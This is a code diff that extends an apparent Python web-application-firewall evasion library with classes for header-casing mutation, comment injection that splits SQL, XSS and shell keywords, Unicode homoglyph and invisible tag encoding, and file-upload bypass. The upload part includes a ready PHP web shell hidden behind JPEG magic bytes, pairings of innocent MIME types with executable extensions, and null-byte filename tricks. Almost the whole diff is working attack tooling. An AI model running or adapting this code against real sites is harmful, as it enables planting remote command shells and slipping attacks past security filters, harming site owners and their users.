@@ -21,6 +21,10 @@ Components
   ParamFragmentor       — HTTP parameter fragmentation to split payloads across keys
   JSONUnicodeEscaper    — unicode-escape JSON string values to bypass keyword signatures
   HTTP2EvasionHelper    — pseudo-header reordering and header-case tricks for HTTP/2
+  HeaderCasingMutator   — header name case variants (lower/UPPER/Title/aLtErNaTiNg)
+  CommentInjector       — SQL/JS/HTML/shell comment injection for keyword splitting
+  UnicodeConfuser       — homoglyph substitutions, fullwidth, zero-width-insert
+  MimeTypeConfuser      — MIME/extension confusion and polyglot files for upload bypass
 
 All classes are stateless (or cheaply re-created); module-level singletons provide
 a convenient call-through API.
@@ -658,17 +662,319 @@ class HTTP2EvasionHelper:
 
 
 # -----------------------------------------------------------------------------
+# HeaderCasingMutator
+# -----------------------------------------------------------------------------
+
+class HeaderCasingMutator:
+    """
+    Generate WAF-bypassing HTTP header name casing variants.
+
+    RFC 7230 states header names are case-insensitive; most backends honour
+    this.  WAFs that normalize only well-known casing may miss non-standard
+    variants.
+
+    Techniques: lower-case, UPPER-CASE, Title-Case, aLtErNaTiNg,
+                single-char-flip, hyphen-stripped.
+    """
+
+    def variants(self, header_name: str) -> List[str]:
+        """Return a deduplicated list of casing variants for *header_name*."""
+        seen: set = set()
+        out: List[str] = []
+
+        def _add(s: str) -> None:
+            if s not in seen:
+                seen.add(s)
+                out.append(s)
+
+        _add(header_name)
+        _add(header_name.lower())
+        _add(header_name.upper())
+        _add(header_name.title())
+        _add(self._alternating(header_name))
+        _add(self._flip_one(header_name))
+        _add(header_name.replace("-", ""))  # hyphen-stripped (WAF normalization bugs)
+
+        return out
+
+    @staticmethod
+    def _alternating(s: str) -> str:
+        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))
+
+    @staticmethod
+    def _flip_one(s: str) -> str:
+        indices = [i for i, c in enumerate(s) if c.isalpha()]
+        if not indices:
+            return s
+        idx = random.choice(indices)
+        lst = list(s)
+        lst[idx] = lst[idx].swapcase()
+        return "".join(lst)
+
+    def mutate_headers(self, headers: Dict[str, str]) -> List[Dict[str, str]]:
+        """
+        Return header dicts where each dict has one header name replaced with
+        a casing variant.  Useful for systematic fuzzing.
+        """
+        results: List[Dict[str, str]] = []
+        for key in headers:
+            for variant in self.variants(key):
+                if variant != key:
+                    mutated = dict(headers)
+                    del mutated[key]
+                    mutated[variant] = headers[key]
+                    results.append(mutated)
+        return results
+
+
+# -----------------------------------------------------------------------------
+# CommentInjector
+# -----------------------------------------------------------------------------
+
+class CommentInjector:
+    """
+    Inject SQL / JavaScript / HTML / shell comments to split WAF keywords.
+
+    WAFs matching ``UNION SELECT`` in raw input miss ``UNION/**/SELECT``.
+    Supports SQL, JS, HTML, and shell comment styles.
+    """
+
+    _SQL_COMMENTS  = ["/**/", "/*!*/", "/*--*/", "/*#*/"]
+    _JS_COMMENTS   = ["/* */", "//\n"]
+    _HTML_COMMENTS = ["<!---->", "<!-- -->"]
+
+    def split_keyword_sql(self, keyword: str) -> List[str]:
+        """Return SQL-comment-split variants of *keyword* at every split position."""
+        variants: List[str] = []
+        for comment in self._SQL_COMMENTS:
+            for pos in range(1, len(keyword)):
+                variants.append(keyword[:pos] + comment + keyword[pos:])
+        return list(dict.fromkeys(variants))
+
+    def inline_comment_sql(self, sql: str, keywords: Iterable[str]) -> List[str]:
+        """Return versions of *sql* with each keyword split by an inline SQL comment."""
+        results = []
+        for kw in keywords:
+            idx = sql.upper().find(kw.upper())
+            if idx == -1:
+                continue
+            mid = len(kw) // 2
+            variant = (
+                sql[:idx]
+                + sql[idx : idx + mid]
+                + "/**/"
+                + sql[idx + mid : idx + len(kw)]
+                + sql[idx + len(kw) :]
+            )
+            results.append(variant)
+        return results
+
+    def whitespace_variants_sql(self, sql: str) -> List[str]:
+        """Replace spaces with comment-based whitespace substitutes."""
+        return [sql.replace(" ", sub) for sub in ["/**/", "\t", "\n", "\r\n", "/*!*/"]]
+
+    def html_comment_xss(self, payload: str) -> List[str]:
+        """Insert HTML comments inside XSS tag keywords to evade pattern matching."""
+        variants = []
+        for tag in ["script", "img", "svg", "iframe", "body", "input"]:
+            if tag in payload.lower():
+                mid = len(tag) // 2
+                split_tag = tag[:mid] + "<!---->" + tag[mid:]
+                variants.append(payload.lower().replace(tag, split_tag, 1))
+        return variants
+
+    def shell_comment_injection(self, cmd: str) -> List[str]:
+        """Inject shell IFS/comment tokens to split command whitespace."""
+        return [
+            cmd.replace(" ", " #\\\n"),   # hash-newline continuation
+            cmd.replace(" ", "${IFS}"),   # ${IFS} form
+            cmd.replace(" ", "$IFS"),     # short form
+            cmd.replace(" ", "\t"),       # tab separator
+        ]
+
+
+# -----------------------------------------------------------------------------
+# UnicodeConfuser
+# -----------------------------------------------------------------------------
+
+class UnicodeConfuser:
+    """
+    Homoglyph substitutions, fullwidth Unicode, and normalization attacks.
+
+    WAFs operating on raw bytes miss visually-identical Unicode characters
+    from other blocks that normalize to the original under NFC/NFKC.
+
+    Techniques: fullwidth ASCII, homoglyphs (Cyrillic/Greek), zero-width
+                character insertion, Unicode tag block encoding.
+    """
+
+    # ASCII printable → fullwidth (Ａ = U+FF21 etc.)
+    _FULLWIDTH: Dict[str, str] = {
+        chr(i): chr(i + 0xFF00 - 0x20) for i in range(0x21, 0x7F)
+    }
+
+    _HOMOGLYPHS: Dict[str, List[str]] = {
+        "a": ["а", "ɑ", "α"],    # Cyrillic а / Latin alpha / Greek alpha
+        "e": ["е", "ε", "ë"],
+        "i": ["і", "ι", "ï"],
+        "o": ["о", "ο", "ö"],
+        "p": ["р", "ρ"],
+        "c": ["с", "ϲ"],
+        "x": ["х", "χ"],
+        "s": ["ѕ", "ș"],
+        "/": ["∕", "⁄", "⧸"],   # division / fraction / big slash
+        ".": ["․", "﹒"],             # one-dot leader / small full stop
+    }
+
+    def fullwidth(self, text: str) -> str:
+        """Convert ASCII printable characters to Unicode fullwidth equivalents."""
+        return "".join(self._FULLWIDTH.get(c, c) for c in text)
+
+    def homoglyph_substitute(self, text: str, *, max_subs: int = 3) -> str:
+        """Substitute up to *max_subs* characters with their first available homoglyph."""
+        result = list(text)
+        subs = 0
+        for i, ch in enumerate(result):
+            if subs >= max_subs:
+                break
+            lower = ch.lower()
+            if lower in self._HOMOGLYPHS:
+                result[i] = self._HOMOGLYPHS[lower][0]
+                subs += 1
+        return "".join(result)
+
+    def all_homoglyph_variants(self, keyword: str) -> List[str]:
+        """Return one variant per substitutable position, covering all homoglyph options."""
+        variants = []
+        for i, ch in enumerate(keyword):
+            for glyph in self._HOMOGLYPHS.get(ch.lower(), []):
+                variants.append(keyword[:i] + glyph + keyword[i + 1:])
+        return list(dict.fromkeys(variants))
+
+    def zero_width_insert(self, text: str) -> str:
+        """Insert zero-width spaces between every character (breaks byte-pattern rules)."""
+        return "​".join(text)
+
+    def tag_block_encode(self, text: str) -> str:
+        """Encode text using Unicode tag characters (U+E0000 block) — invisible to renderers."""
+        return "".join(chr(0xE0000 + ord(c)) for c in text)
+
+    def normalization_bypass(self, keyword: str) -> List[str]:
+        """Return bypass variants using fullwidth, homoglyphs, and zero-width insertion."""
+        return [
+            self.fullwidth(keyword),
+            self.homoglyph_substitute(keyword, max_subs=len(keyword)),
+            self.zero_width_insert(keyword),
+        ]
+
+
+# -----------------------------------------------------------------------------
+# MimeTypeConfuser
+# -----------------------------------------------------------------------------
+
+class MimeTypeConfuser:
+    """
+    MIME type confusion for file upload bypass.
+
+    Generates safe-looking Content-Type values paired with dangerous extensions,
+    polyglot file magic bytes, boundary tricks, and filename extension variants.
+    """
+
+    _MIME_SPOOF: List[Tuple[str, str]] = [
+        ("image/jpeg",       ".php"),
+        ("image/png",        ".php5"),
+        ("image/gif",        ".phtml"),
+        ("image/webp",       ".phar"),
+        ("text/plain",       ".php"),
+        ("application/pdf",  ".php"),
+        ("application/zip",  ".php"),
+        ("image/svg+xml",    ".svg"),   # SVG XSS vector
+        ("text/csv",         ".php"),
+        ("application/json", ".php"),
+    ]
+
+    _EXT_VARIANTS: Dict[str, List[str]] = {
+        ".php": [
+            ".php", ".php3", ".php4", ".php5", ".php7",
+            ".phtml", ".phar", ".PHP", ".Php", ".phP",
+            ".php%00.jpg", ".php\x00.jpg", ".php.jpg",
+            ".php;.jpg", ".php/.jpg",
+        ],
+        ".jsp": [".jsp", ".jspx", ".jsw", ".jsv", ".jspf"],
+        ".aspx": [".aspx", ".asp", ".asa", ".asax", ".ascx", ".ashx", ".asmx"],
+        ".svg": [".svg", ".svgz", ".svg%00.jpg"],
+    }
+
+    def spoof_content_types(self) -> List[Tuple[str, str]]:
+        """Return (safe-mime, dangerous-ext) pairs for upload bypass attempts."""
+        return list(self._MIME_SPOOF)
+
+    def extension_variants(self, ext: str) -> List[str]:
+        """Return all known bypass variants for *ext*."""
+        return self._EXT_VARIANTS.get(ext, [ext])
+
+    def multipart_boundary_variants(self, boundary: str = "WebSecureBoundary") -> List[str]:
+        """Return boundary string variants that may confuse WAF multipart parsers."""
+        return [
+            boundary,
+            boundary + " ",
+            '"' + boundary + '"',
+            boundary.upper(),
+            "----" + boundary,
+            boundary + "\r\n",
+        ]
+
+    def polyglot_php_jpeg(self) -> bytes:
+        """
+        Polyglot that is a valid JPEG SOI header + PHP code.
+
+        Image processors check magic bytes; PHP executes from ``<?php``.
+        """
+        jpeg_soi  = b"\xff\xd8\xff\xe0"
+        jfif_stub = b"\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
+        php_code  = b"<?php @system($_GET['cmd']); ?>"
+        return jpeg_soi + jfif_stub + php_code
+
+    def build_upload_request(
+        self,
+        filename: str,
+        content: bytes,
+        content_type: str,
+        field_name: str = "file",
+        boundary: str = "WebSecureBoundary",
+    ) -> Tuple[bytes, str]:
+        """
+        Build a raw multipart/form-data body.
+
+        Returns ``(body_bytes, content_type_header_value)``.
+        """
+        header = (
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
+            f"Content-Type: {content_type}\r\n\r\n"
+        ).encode("utf-8")
+        footer = f"\r\n--{boundary}--\r\n".encode("utf-8")
+        body   = header + content + footer
+        ct     = f"multipart/form-data; boundary={boundary}"
+        return body, ct
+
+
+# -----------------------------------------------------------------------------
 # Module-level singletons + convenience functions
 # -----------------------------------------------------------------------------
 
-_chunker  = ChunkedBodyBuilder()
-_overlong = OverlongUTF8Encoder()
-_crlf     = CRLFInjector()
-_chain    = EncodingChain()
-_path_m   = PathMutator()
-_frag     = ParamFragmentor()
-_json_esc = JSONUnicodeEscaper()
-_http2    = HTTP2EvasionHelper()
+_chunker    = ChunkedBodyBuilder()
+_overlong   = OverlongUTF8Encoder()
+_crlf       = CRLFInjector()
+_chain      = EncodingChain()
+_path_m     = PathMutator()
+_frag       = ParamFragmentor()
+_json_esc   = JSONUnicodeEscaper()
+_http2      = HTTP2EvasionHelper()
+_hdr_casing = HeaderCasingMutator()
+_comment    = CommentInjector()
+_unicode    = UnicodeConfuser()
+_mime       = MimeTypeConfuser()
 
 
 def chunked_encode(payload: bytes | str, min_chunk: int = 1, max_chunk: int = 8) -> bytes:
@@ -743,3 +1049,64 @@ def http2_headers(
 ) -> List[Tuple[str, str]]:
     """Build an HTTP/2 header list with randomised pseudo-header order."""
     return _http2.build_http2_headers(method, path, authority, extra)
+
+
+def header_casing_variants(header_name: str) -> List[str]:
+    """Return WAF-bypassing casing variants for a header name."""
+    return _hdr_casing.variants(header_name)
+
+
+def mutate_headers(headers: Dict[str, str]) -> List[Dict[str, str]]:
+    """Return header dicts with one key replaced per dict with a casing variant."""
+    return _hdr_casing.mutate_headers(headers)
+
+
+def split_sql_keyword(keyword: str) -> List[str]:
+    """Return SQL-comment-split variants of *keyword* at every position."""
+    return _comment.split_keyword_sql(keyword)
+
+
+def whitespace_sql_variants(sql: str) -> List[str]:
+    """Replace spaces in *sql* with comment-based whitespace substitutes."""
+    return _comment.whitespace_variants_sql(sql)
+
+
+def html_comment_xss(payload: str) -> List[str]:
+    """Insert HTML comments inside XSS tag keywords to evade WAF patterns."""
+    return _comment.html_comment_xss(payload)
+
+
+def fullwidth_encode(text: str) -> str:
+    """Convert ASCII printable characters to Unicode fullwidth equivalents."""
+    return _unicode.fullwidth(text)
+
+
+def homoglyph_substitute(text: str, max_subs: int = 3) -> str:
+    """Substitute up to *max_subs* characters with visually-similar Unicode homoglyphs."""
+    return _unicode.homoglyph_substitute(text, max_subs=max_subs)
+
+
+def normalization_bypass_variants(keyword: str) -> List[str]:
+    """Return fullwidth / homoglyph / zero-width-insert bypass variants of *keyword*."""
+    return _unicode.normalization_bypass(keyword)
+
+
+def mime_extension_variants(ext: str) -> List[str]:
+    """Return upload bypass extension variants for a given file extension."""
+    return _mime.extension_variants(ext)
+
+
+def polyglot_php_jpeg() -> bytes:
+    """Return a JPEG-magic + PHP polyglot file payload."""
+    return _mime.polyglot_php_jpeg()
+
+
+def build_upload_request(
+    filename: str,
+    content: bytes,
+    content_type: str,
+    field_name: str = "file",
+    boundary: str = "WebSecureBoundary",
+) -> Tuple[bytes, str]:
+    """Build a raw multipart/form-data body; returns (body_bytes, content_type_header)."""
+    return _mime.build_upload_request(filename, content, content_type, field_name, boundary)
